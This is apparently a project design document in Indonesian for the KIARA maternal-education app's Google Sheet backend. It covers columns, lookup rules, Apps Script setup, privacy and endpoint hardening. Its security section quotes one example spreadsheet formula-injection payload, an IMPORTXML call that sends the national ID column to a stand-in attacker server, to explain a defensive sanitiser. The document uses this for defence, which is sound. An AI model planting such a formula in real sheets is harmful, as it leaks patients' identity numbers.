# Struktur Google Sheet — KIARA

Rancangan penyimpanan data KIARA. Dokumen ini mengikuti apa yang benar-benar
dibaca dan ditulis `gas/Code.gs`, jadi bisa dipakai sebagai acuan setup sheet
maupun sebagai penjelasan ke puskesmas.

Struktur 13 kolom di bawah **disediakan puskesmas**, bukan usulan pengembang.

---

## 1. Prinsip

**Satu baris = satu kunjungan.** Bukan satu baris per pasien. Ibu yang sudah
ikut 3 sesi punya 3 baris dengan NIK yang sama.

Konsekuensinya, tidak ada tabel identitas terpisah. Nama, alamat, kelurahan,
dan puskesmas ditulis ulang di setiap baris. Ini menghasilkan pengulangan data,
tapi menjaga strukturnya tetap satu sheet dan mudah difilter bidan.

Nomor sesi berikutnya **tidak disimpan** sebagai angka tersendiri. Aplikasi
menghitungnya: cari semua baris dengan NIK sama, ambil nilai `Kunjungan ke-`
terbesar, tambah satu.

---

## 2. Kolom

| # | Kolom | Tipe | Format | Sumber | Contoh |
|---|---|---|---|---|---|
| A | `No` | Angka | — | dihitung backend | `1` |
| B | `Date` | **Teks** | `dd-mm-yyyy` | waktu server (Asia/Jakarta) | `03-08-2026` |
| C | `Time` | **Teks** | `HH:mm:ss` | waktu server (Asia/Jakarta) | `09:14:27` |
| D | `Nama` | Teks | — | input pasien | `Siti Aminah` |
| E | `NIK` | **Teks** | 16 digit | input pasien | `3175012345671234` |
| F | `No WA` | **Teks** | diawali `0` | input pasien | `081234567890` |
| G | `Alamat` | Teks | bebas | input pasien | `Jl. Melati No. 5 RT 03/RW 04` |
| H | `Kelurahan` | Teks | 1 dari 8 pilihan | dropdown aplikasi | `Pulo Gebang` |
| I | `Puskesmas` | Teks | 1 dari 9 pilihan | dropdown aplikasi | `Pustu Pulo Gebang` |
| J | `Kunjungan ke-` | Angka | 1–4 | dihitung backend | `3` |
| K | `Pre-Test` | Angka | 0–100 | dihitung aplikasi | `40` |
| L | `Post-Test` | Angka | 0–100 | dihitung aplikasi | `90` |
| M | `Status` | Teks | `LULUS` / `BELUM` | dihitung backend | `LULUS` |

### Kenapa empat kolom harus bertipe TEKS

Ini bukan preferensi, tapi keharusan:

| Kolom | Kalau dibiarkan Otomatis/Angka |
|---|---|
| `NIK` | 16 digit melebihi presisi angka Sheets → berubah jadi `3.17501E+15`, digit belakang hilang |
| `No WA` | angka `0` di depan dihapus → `081234567890` jadi `81234567890` |
| `Date` | Sheets menafsirkan ulang `dd-mm-yyyy` sebagai `mm-dd-yyyy` di sebagian locale |
| `Time` | dikonversi jadi angka pecahan hari |

Backend sudah menulis nilai-nilai itu dengan apostrof di depan (`'03-08-2026`)
untuk memaksa teks. Apostrofnya tidak terlihat di sel dan tidak ikut terbaca
saat aplikasi melakukan lookup. Meski begitu, **kolom B, C, E, F sebaiknya juga
diformat sebagai Plain text** lewat Format → Number → Plain text, sebagai
lapisan pengaman kalau ada yang mengisi manual.

### Nilai yang mungkin di Pre-Test dan Post-Test

Satu set soal berisi 10 pertanyaan Benar/Salah, masing-masing bernilai 10 poin.
Jadi nilainya **hanya kelipatan 10**: `0, 10, 20, … 100`. Tidak akan ada nilai
seperti 75 atau 83.

Dengan KKM 75, `Status` menjadi `LULUS` mulai dari nilai **80**, yang berarti
minimal **8 dari 10 jawaban benar**. Kalau puskesmas sebenarnya menghendaki
7 dari 10 sudah cukup, KKM harus diubah ke 70 di `config.js`.

---

## 3. Bagaimana aplikasi memakai sheet ini

### Lookup — menentukan sesi ke berapa

Dipakai saat pasien menekan SUBMIT, sebelum layar konfirmasi muncul.

1. Ambil semua baris, bandingkan kolom `NIK` (hanya angkanya, apostrof dan
   spasi diabaikan)
2. Tidak ada yang cocok → pasien baru, mulai dari sesi 1
3. Ada yang cocok → urutkan berdasarkan `Kunjungan ke-`, ambil yang terbesar
4. Sesi berikutnya = terbesar + 1
5. Nama, alamat, kelurahan, dan puskesmas diambil dari baris kunjungan
   terakhir, dipakai untuk ditampilkan di layar konfirmasi

### Guard duplikat harian

Tanggal kunjungan terakhir diambil dari **tanggal paling akhir di seluruh
riwayat**, bukan dari baris dengan nomor sesi terbesar. Ini penting kalau ada
baris yang dikoreksi manual dan urutannya jadi tidak sejalan.

Kalau tanggal itu sama dengan hari ini, pasien diarahkan ke layar
"Sudah Tercatat Hari Ini" dan tidak bisa menambah baris baru.

### Simpan hasil

Cari baris dengan `NIK` **dan** `Kunjungan ke-` yang sama.

| Kondisi | Perilaku |
|---|---|
| Belum ada | tambah baris baru |
| Sudah ada, submit pertama | tolak, balikan `DUPLIKAT` |
| Sudah ada, post-test diulang | perbarui `Post-Test`, `Status`, dan `Time` di baris yang sama |

Post-test yang diulang **tidak menambah baris**. Yang tersimpan selalu nilai
percobaan terakhir.

### Kolom `No`

Diisi dari nilai terbesar yang ada di kolom `No`, bukan dari jumlah baris.
Ini supaya nomornya tetap benar kalau ada baris yang pernah dihapus manual.

### Penulisan bersamaan

`handleSave` memakai `LockService` dengan tunggu maksimal 20 detik. Dua pasien
yang menekan submit pada saat yang sama tidak akan menimpa baris satu sama lain.

---

## 4. Yang TIDAK tercatat di struktur ini

Struktur 13 kolom tidak punya tempat untuk empat hal berikut. Aplikasinya tetap
berfungsi, tapi informasinya hilang begitu sesi selesai.

| Informasi | Kenapa berguna | Akibat tidak ada |
|---|---|---|
| **Penanda koreksi manual** | Kalau ibu menyatakan sudah pernah ikut tapi NIK-nya tidak ditemukan, aplikasi menawarkan koreksi manual nomor sesi | Bidan tidak tahu baris mana yang perlu diverifikasi. Data hasil koreksi terlihat sama seperti data yang terdeteksi otomatis |
| **Jumlah percobaan post-test** | Ibu boleh mengulang post-test tanpa batas | Nilai 90 dari percobaan pertama dan dari percobaan kelima terlihat identik. Efektivitas edukasi jadi tidak terukur |
| **Materi yang tuntas ditonton** | Gate materi mencatat mana yang benar-benar selesai | Tidak bisa dibedakan ibu yang menyimak seluruh materi dari yang materinya kosong |
| **Wilayah TTD / MMS** | Sebagian materi dan 3 soal berbeda antar wilayah | Kalau nanti dua wilayah dipakai bersamaan, datanya tercampur tanpa penanda |

### Usulan kolom tambahan

Kalau puskesmas bersedia menambah kolom, tiga ini yang paling bernilai:

| # | Kolom | Tipe | Isi |
|---|---|---|---|
| N | `Sumber` | Teks | `SISTEM` / `MANUAL` — menandai baris yang perlu verifikasi bidan |
| O | `Percobaan` | Angka | berapa kali post-test diulang, minimal 1 |
| P | `Materi Tuntas` | Teks | `2/3` — materi selesai dari total materi sesi itu |

Menambah kolom ini butuh perubahan kecil di `gas/Code.gs` dan
`visit-tracker.js`. Struktur yang ada sekarang tidak perlu diubah — kolom baru
tinggal ditambahkan di sebelah kanan.

---

## 5. Spreadsheet yang dipakai

| | |
|---|---|
| Nama spreadsheet | **Rekap Hasil Kiara 2026** |
| Nama tab | **KIARA** |
| ID | `1XYrAku9STj5i3Ojz0MIj4uMLlT5lUuF5aGchEkZkXfk` |

Nama tab dipatok di `gas/Code.gs` lewat `NAMA_SHEET = 'KIARA'`, bukan memakai
"sheet pertama". Alasannya: kalau nanti ditambah tab `REKAP` dan posisinya di
sebelah kiri, data pasien bisa masuk ke tab yang salah.

### Pemeriksaan header otomatis

Sebelum menulis, backend membandingkan baris 1 dengan 13 nama kolom yang
diharapkan. Perbandingannya toleran terhadap huruf besar-kecil dan tanda baca,
jadi `No WA`, `No. WA`, dan `no wa` dianggap sama.

Kalau ada kolom yang disisipkan atau bergeser, `save` **ditolak** dengan pesan
yang menyebut kolom mana yang tidak cocok. Ini disengaja: tanpa pemeriksaan itu,
backend akan tetap menulis dan datanya masuk ke kolom yang salah tanpa ada yang
sadar sampai berminggu-minggu kemudian.

---

## 6. Cara Setup

### Langkah 1 — Siapkan sheet

Baris 1 berisi header, tepat seperti ini, di kolom A sampai M:

```
No | Date | Time | Nama | NIK | No WA | Alamat | Kelurahan | Puskesmas | Kunjungan ke- | Pre-Test | Post-Test | Status
```

Lalu:
- Blok kolom **B, C, E, F** → Format → Number → **Plain text**
- Baris 1 → View → Freeze → **1 row**, dan tebalkan supaya jelas
- Pastikan nama tab-nya **KIARA**. Kalau diganti, sesuaikan `NAMA_SHEET`
  di `gas/Code.gs`

### Langkah 2 — Pasang Apps Script

1. Extensions → Apps Script
2. Tempel seluruh isi `gas/Code.gs`, Save
3. Run → **cekSheet** sekali, beri izin. Fungsi ini menampilkan nama sheet,
   jumlah baris, dan header yang terbaca — untuk memastikan tidak ada kolom
   yang bergeser
4. Deploy → New deployment → **Web app**
   - Execute as: **Me**
   - Who has access: **Anyone**
5. Salin Web app URL

> Setiap `Code.gs` diubah, wajib **Deploy → Manage deployments → Edit →
> New version**. Kalau hanya Save, perubahannya tidak terpakai.

### Langkah 3 — Sambungkan aplikasi

Di `config.js`:

```js
SHEETS_ENDPOINT: 'https://script.google.com/macros/s/AKfyc.../exec',
OFFLINE_MODE: false,
```

### Langkah 4 — Uji sheet dulu, sebelum menyambungkan aplikasi

`gas/Code.gs` punya tiga fungsi uji yang dijalankan langsung dari editor
Apps Script. Tujuannya memisahkan masalah: kalau ketiganya lolos, berarti nama
tab, susunan kolom, dan izin sudah benar — sisa masalah pasti di sisi aplikasi.

| Fungsi | Yang dilakukan |
|---|---|
| `cekSheet` | tampilkan nama spreadsheet, nama tab, jumlah baris, dan hasil pembandingan header |
| `ujiTulis` | tulis satu baris uji lewat jalur yang sama dengan aplikasi (`handleSave`), jadi validasi header dan penguncian ikut teruji |
| `ujiBaca` | pastikan lookup menemukan baris uji dan menghitung sesi berikutnya dengan benar |
| `hapusUji` | hapus semua baris uji, aman dijalankan berkali-kali |

Urutan menjalankannya: `cekSheet` → `ujiTulis` → periksa sheet → `ujiBaca` →
`hapusUji`.

Yang wajib diperiksa mata sendiri setelah `ujiTulis`:

- **NIK utuh 16 digit** — kalau muncul `9,99999E+15`, kolom E belum berformat
  Plain text
- **No WA masih diawali `0`** — kalau jadi `81200000000`, kolom F belum Plain text
- **Tanggal berformat `dd-mm-yyyy`** — kalau bulan dan tanggalnya tertukar,
  kolom B belum Plain text

Baris uji memakai NIK `9999999999999999` dan nama `UJI COBA - HAPUS` supaya
mustahil tertukar dengan data pasien sungguhan.

### Langkah 5 — Uji lewat aplikasi

Setelah `SHEETS_ENDPOINT` diisi dan `OFFLINE_MODE: false`:

1. Isi satu data uji dari aplikasi, selesaikan sampai layar hasil akhir
2. Pastikan satu baris masuk dengan nilai yang benar
3. Masukkan NIK yang sama lagi di hari yang sama → harus muncul layar
   "Sudah Tercatat Hari Ini", dan **tidak ada baris tambahan** di sheet
4. Hapus baris uji setelah selesai

---

## 7. Privasi

**NIK disimpan apa adanya**, sesuai struktur yang diminta. Ini membuat lookup
sederhana dan memudahkan bidan memverifikasi identitas, tapi ada tiga hal yang
perlu disadari:

Google Sheets hanya punya kontrol akses **per-file**, tanpa audit log yang
memadai. Siapa pun yang punya akses ke file bisa melihat seluruh NIK.

Karena endpoint memakai GET, **NIK ikut muncul di query string** dan tercatat
di log eksekusi Apps Script — bukan hanya di spreadsheet.

Di pesan WhatsApp ke bidan, NIK ditampilkan **tersamar** (`3175••••••••1234`)
untuk mengurangi paparan di jalur yang lebih sulit dikendalikan.

Yang wajib dilakukan:

- Bagikan spreadsheet **hanya ke akun bidan tertentu**. Jangan pernah memakai
  opsi *anyone with the link*
- Jangan salin isi sheet ke grup WhatsApp atau file yang lebih luas
- Kalau puskesmas menghendaki standar lebih tinggi, alternatifnya menyimpan
  hash SHA-256 untuk pencarian dan hanya 4 digit depan dan belakang untuk
  tampilan. Ini bisa dikerjakan, tapi mengubah kolom `NIK` jadi tidak lagi
  bisa dibaca manusia

### Keamanan endpoint

URL Web App di-deploy dengan *Who has access: Anyone*, jadi **siapa pun yang
punya URL itu bisa menulis ke sheet**. Ini bukan pilihan: aplikasinya statis
(GitHub Pages), tidak ada server tempat menyimpan rahasia, dan URL-nya selalu
terlihat di DevTools. Karena repo aplikasinya publik, URL itu juga bisa
ditemukan pemindai otomatis GitHub.

Selama masa uji risiko ini diterima. **Sebelum dipakai pasien nyata**, lakukan
salah satu:

- Apps Script → *Deploy → Manage deployments → Edit → New version*. URL berubah,
  yang lama mati. Perbarui `SHEETS_ENDPOINT` di `config.js`
- atau jadikan repo GitHub private

Yang sudah dipasang di `gas/Code.gs` sebagai peredam:

| Peredam | Fungsi | Yang dicegah |
|---|---|---|
| Validasi per field | `validasiSimpan()` | Data ngawur masuk sheet dan mengotori rekap bidan |
| Daftar tertutup | `KELURAHAN_SAH`, `PUSKESMAS_SAH` | Kelurahan/puskesmas karangan — request dari luar aplikasi langsung tertolak |
| Clamp nilai | `dalamRentang()` | Klien mengirim `kkm=0` supaya semua orang jadi `LULUS` |
| Pembatas laju | `lolosThrottle()` | Sheet dibanjiri ribuan baris; batas 40 penyimpanan / 10 menit |
| Penetral formula | `amanTeks()` | Injeksi formula Sheets (lihat di bawah) |
| Validasi header | `bedaHeader()` | Data masuk ke kolom yang salah kalau susunan sheet bergeser |

Aturan validasinya:

| Field | Aturan |
|---|---|
| NIK | tepat 16 digit angka |
| Nama | 3–80 karakter, tanpa `<` `>` dan tanpa URL |
| No WA | `0` di depan, total 9–15 digit |
| Alamat | 5–200 karakter, tanpa `<` `>` dan tanpa URL |
| Kelurahan | harus salah satu dari 8 kelurahan resmi |
| Puskesmas | harus salah satu dari 9 puskesmas/pustu resmi |
| Kunjungan ke- | bilangan bulat 1–10 |
| Pre-Test / Post-Test | bilangan bulat 0–100 **dan kelipatan 10** |

Skor wajib kelipatan 10 karena setiap set berisi 10 soal Benar/Salah — nilai
seperti 77 tidak mungkin datang dari aplikasi.

**Injeksi formula Sheets.** Ini risiko yang nyata justru karena bidan membuka
spreadsheet-nya. Sel yang isinya diawali `=` `+` `-` `@` akan dieksekusi Sheets
sebagai formula saat file dibuka. Kalau seseorang mengisi kolom Nama dengan

```
=IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50);"//a")
```

maka begitu bidan membuka sheet, seluruh kolom NIK terkirim ke server luar —
tanpa perlu menembus apa pun. `amanTeks()` menambahkan prefiks apostrof pada
nilai semacam itu supaya Sheets memperlakukannya sebagai teks biasa. Apostrofnya
dilepas kembali oleh `tanpaApostrof()` saat data dibaca ke aplikasi, jadi form
tidak pernah menampilkan tanda itu.

Untuk memastikan semuanya aktif, jalankan **`ujiValidasi()`** dari editor Apps
Script. Fungsi ini tidak menulis apa pun ke sheet — hanya melempar 15 payload
buruk ke validator dan melaporkan mana yang tertolak.

> Setiap `gas/Code.gs` diubah, perubahan **belum berlaku** sampai
> *Deploy → Manage deployments → Edit → New version* dijalankan.

---

## 8. Contoh isi

Satu pasien yang sudah ikut 3 sesi dan satu pasien baru:

| No | Date | Time | Nama | NIK | No WA | Alamat | Kelurahan | Puskesmas | Kunjungan ke- | Pre-Test | Post-Test | Status |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 1 | 12-05-2026 | 08:41:02 | Siti Aminah | 3175012345671234 | 081234567890 | Jl. Melati No. 5 | Pulo Gebang | Pustu Pulo Gebang | 1 | 40 | 90 | LULUS |
| 2 | 09-06-2026 | 09:15:33 | Siti Aminah | 3175012345671234 | 081234567890 | Jl. Melati No. 5 | Pulo Gebang | Pustu Pulo Gebang | 2 | 60 | 100 | LULUS |
| 3 | 03-08-2026 | 09:14:27 | Siti Aminah | 3175012345671234 | 081234567890 | Jl. Melati No. 5 | Pulo Gebang | Pustu Pulo Gebang | 3 | 50 | 60 | BELUM |
| 4 | 03-08-2026 | 10:02:11 | Ratna Dewi | 3175999988887777 | 081200001111 | Jl. Kenanga No. 2 | Jatinegara | Puskesmas Cakung | 1 | 30 | 80 | LULUS |

Dari contoh ini: Siti Aminah berikutnya akan otomatis terdeteksi **sesi 4**.
Kalau dia membuka aplikasi lagi hari ini, dia akan tertahan di layar duplikat.

---

## 9. Rekap untuk bidan (opsional)

Kalau bidan butuh ringkasan tanpa dashboard terpisah, tambahkan sheet kedua
bernama `REKAP` dan tempel rumus berikut. Sheet ini hanya membaca, tidak
disentuh aplikasi. Ganti `Sheet1` sesuai nama sheet data.

| Keterangan | Rumus |
|---|---|
| Total kunjungan tercatat | `=COUNTA(Sheet1!E2:E)` |
| Jumlah pasien unik | `=COUNTA(UNIQUE(FILTER(Sheet1!E2:E;Sheet1!E2:E<>"")))` |
| Kunjungan bulan ini | `=SUMPRODUCT((TEXT(Sheet1!B2:B;"mm-yyyy")=TEXT(TODAY();"mm-yyyy"))*1)` |
| Jumlah berstatus LULUS | `=COUNTIF(Sheet1!M2:M;"LULUS")` |
| Rata-rata Pre-Test | `=ROUND(AVERAGE(Sheet1!K2:K);1)` |
| Rata-rata Post-Test | `=ROUND(AVERAGE(Sheet1!L2:L);1)` |
| Rata-rata kenaikan | `=ROUND(AVERAGE(Sheet1!L2:L)-AVERAGE(Sheet1!K2:K);1)` |
| Rekap per kelurahan | `=QUERY(Sheet1!H2:M;"select Col1, count(Col1) where Col1 is not null group by Col1 label count(Col1) 'Jumlah'")` |
| Pasien yang belum lulus | `=QUERY(Sheet1!D2:M;"select Col1, Col7, Col9, Col10 where Col10 = 'BELUM'")` |

Untuk menyorot status secara visual: pilih kolom M → Format → Conditional
formatting → *Text is exactly* `BELUM` → latar kuning, dan `LULUS` → latar hijau.

---

## 10. Warisan dari EduCatin

Pola backend KIARA mengikuti `google-apps-script.js` milik EduCatin, yang sudah
terbukti jalan di produksi. Yang dipakai ulang apa adanya:

| Pola | Alasan tetap dipakai |
|---|---|
| Endpoint lewat **GET berparameter**, bukan POST | POST ke Apps Script Web App kena redirect 302 yang bikin CORS gagal di browser |
| Waktu server zona **Asia/Jakarta** lewat `toLocaleString` | Apps Script default UTC; tanpa ini tanggal bisa geser sehari |
| Format `dd-mm-yyyy` dan `HH:mm:ss` | sama dengan EduCatin, jadi bidan tidak perlu belajar format baru |
| **Apostrof di depan** nilai teks | mencegah Sheets mengubah NIK jadi notasi ilmiah dan menghapus 0 di depan nomor HP |
| Balasan `ContentService` JSON | pola yang sama dipakai klien untuk membaca hasil |

Tiga hal yang **sengaja dibuat berbeda**, karena KIARA punya kebutuhan yang
tidak ada di EduCatin:

**Kolom `No` dihitung dari nilai terbesar, bukan dari `lastRow`.** EduCatin
memakai `no = lastRow`, yang benar selama tidak ada baris yang dihapus. KIARA
menyimpan sampai 4 baris per pasien dan lebih mungkin dikoreksi manual oleh
bidan, jadi nomornya diambil dari `maks + 1`.

**Ada `LockService`.** EduCatin sekali jalan per pasien, jadi tabrakan tulis
nyaris tidak mungkin. KIARA membaca riwayat lalu menulis berdasarkan hasil
bacaan itu — dua pasien yang submit bersamaan bisa membaca nomor kunjungan yang
sama lalu saling menimpa. Kunci 20 detik menutup celah itu.

**Ada pemeriksaan header sebelum menulis.** EduCatin punya 9 kolom yang jarang
berubah. KIARA punya 13 kolom dan sheet-nya dipegang puskesmas, jadi risiko
kolom disisipkan lebih besar.

---

## 11. Catatan versi

Struktur ini menggantikan rancangan awal yang memakai **dua sheet**
(`MASTER_PASIEN` 14 kolom + `LOG_KUNJUNGAN` 14 kolom) dengan NIK yang di-hash.
Rancangan itu sudah tidak dipakai.

Kolom `Kunjungan ke-` saat ini bernilai **1–4**, mengikuti `TOTAL_SESI: 4` di
`config.js`. Sesi 5–10 masih ditahan menunggu materi dari puskesmas. Ketika
sesi tersebut diaktifkan, tidak ada perubahan struktur sheet yang diperlukan —
nilai di kolom itu tinggal bertambah sampai 10.
